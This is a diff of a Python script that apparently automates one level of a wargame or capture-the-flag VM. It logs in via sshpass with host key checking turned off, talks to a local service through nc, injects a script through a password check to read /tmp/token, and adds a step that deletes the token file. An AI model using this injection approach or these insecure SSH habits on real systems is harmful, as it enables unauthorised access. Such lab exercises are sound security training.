@@ -19,7 +19,8 @@ print_title("Script wait connection on 127.0.0.0:5151")
 print_title("Password calculated by echo with sha1sum, inject out script into it")
 
 dev_null = open(os.devnull, 'w')
-connect_command = f'sshpass -p {get_previous_password()} ssh {get_current_level()}@{VM_ADDRESS} -p {VM_PORT}'
+connect_command = f'sshpass -p {get_previous_password()} ssh {get_current_level()}@{VM_ADDRESS} -p {VM_PORT} ' \
+                  f'-oStrictHostKeyChecking=no'
 
 command = f"{connect_command} nc 127.0.0.1 5151"
 stream = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=dev_null)
@@ -36,6 +37,8 @@ print_title("It's okay, password doesn't match, but we just inject that script")
 token_raw = exec(client, 'cat /tmp/token', title='Check results our tricky move')[0]
 print_output(token_raw)
 print_title("It our biggest win!")
+
+exec(client, 'rm -f /tmp/token', title='Remove tmp file')
 
 token = sanitize_token(token_raw)
 save_token(token)
